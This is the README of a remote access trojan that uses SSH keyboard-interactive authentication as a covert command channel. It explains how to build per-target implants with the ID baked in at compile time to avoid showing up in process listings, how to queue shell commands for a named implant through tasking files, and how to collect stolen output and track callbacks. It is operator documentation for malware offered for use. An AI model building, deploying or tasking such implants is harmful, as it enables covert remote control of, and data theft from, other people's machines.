KbdIntRat
=========
Silly little RAT which makes regular SSH connections to a C2 server, gets
a shell script as the question in
[keyboard-interactive](https://tools.ietf.org/html/rfc4256) authentication,
and sends output as the answer.

The same binary works both as a implant and server (with the `-server` flag).

For legal use only.

Configuration
-------------
Most configuration is done via command-line options.  Please run the program
with `-h` to see a listing of all available options.  Defaults can be changed
near the top of `main()` in [`kbdintrat.go`](./kbdintrat.go), though it is not
expected that this will be necessary very often.

Implant ID
----------
The ID the implant uses is set via the `-id` flag.  This is, of course, a bad
idea to do at runtime as it'll show up in a process listing.  To avoid this,
the `main.ImplantID` variable can be set at compile time to bake in a implant
ID, like
```go
go build -ldflags "-X main.ImplantID=kittens"
```

This can be used to build per-target implants.  The following shell function
can be used to make this a bit easier:
```ksh
function build {
        if [ -z "$1" ]; then
                echo "Usage: build name" >&2
                return 1
        fi
        o=kbdintrat.$1
        go build -v -i -ldflags "-X main.ImplantID=$1" -o $o
        sha256 $o
}
```

Only characters in `[A-Za-z_-]` can be used in implant IDs.  If no ID is
specified either with `-id` at runtime or by setting `main.ImplantID` at
compile time, a random 64-bit unsigned integer expressed in base36 will be
used.

Tasking
-------
Each time an implant checks in to the server, a file in the tasking directory
which has same name as the implant ID will be checked for tasking.  If one
exists and isn't empty, its contents will be sent to the implant for execution.
In other words, to task the implant named `kittens` to send back a a process
listing, assuming the tasking directory is named `tasking`, the following
command may be used:
```sh
echo 'ps auwwwfux' >> tasking/kittens
```

The tasking directory may be changed with the `-tasking` command-line option.

Output
------
Tasking output is put in files with the same name as the implants' IDs in the
output directory, by default `-output` and changeable with the `-output`
command-line option.  To get the ouptut from the previous example (tasking
`kittens` to list processes), the following command may be used:
```sh
cat output/kittens
```

Output is appended to the end of pre-existing output files.

Output files are created when implants first connect and have their timestamps
updated upon each connection.  This can be used to get a good idea of what's
been calling back with just `ls -lart`.

Server Key
----------
The implant will check the server's key fingerprint against the one specified
on the command line.  There is an example key, [`id_rsa`](./id_rsa) included
with the source.  Its fingerprint is the default used by the implant to
authenicate the server.  Please use your own.
